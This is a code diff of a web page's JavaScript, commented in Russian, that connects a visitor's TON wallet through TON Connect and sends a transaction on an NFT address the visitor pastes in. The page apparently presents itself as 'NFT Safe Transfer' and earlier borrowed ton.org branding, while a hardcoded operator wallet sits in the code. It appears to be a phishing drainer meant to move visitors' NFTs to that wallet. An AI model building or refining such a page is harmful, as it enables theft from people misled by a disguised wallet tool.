@@ -32,23 +32,14 @@
     // --- ТВОЙ АДРЕС ---
     const MY_WALLET_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; 
 
-    // Настройка манифеста
-    const manifestJson = {
-        "url": "https://ton.org", // Для тестов можно оставить официальный домен
-        "name": "NFT Safe Transfer",
-        "iconUrl": "https://ton.org/static/mytonwallet.png"
-    };
-   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: "https://site-chi-weld.vercel.app/tonconnect-manifest.json",
-    buttonRootId: 'ton-connect-button'
-});
-
-
-    // Инициализация TonConnect UI
+    // --- Инициализация TonConnect UI с реальным manifest ---
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: manifestUrl,
+        manifestUrl: "https://site-chi-weld.vercel.app/tonconnect-manifest.json",
         buttonRootId: 'ton-connect-button'
     });
+
+    // Принудительно показать кнопку (на всякий случай)
+    document.getElementById('ton-connect-button').style.display = 'flex';
 
     document.getElementById('send-btn').addEventListener('click', async () => {
         const wallet = tonConnectUI.account;
@@ -67,7 +58,6 @@
         // Извлекаем адрес NFT
         let nftAddress;
         try {
-            // Очищаем ссылку от лишнего, берем только EQ... или UQ...
             const match = rawInput.match(/(E|U)Q[a-zA-Z0-9_-]{46}/);
             if (!match) throw new Error();
             nftAddress = match[0];
@@ -95,7 +85,7 @@
                 messages: [
                     {
                         address: nftAddress,
-                        amount: TonCore.toNano('0.05').toString(), // Газ
+                        amount: TonCore.toNano('0.05').toString(),
                         payload: payloadBase64
                     }
                 ]
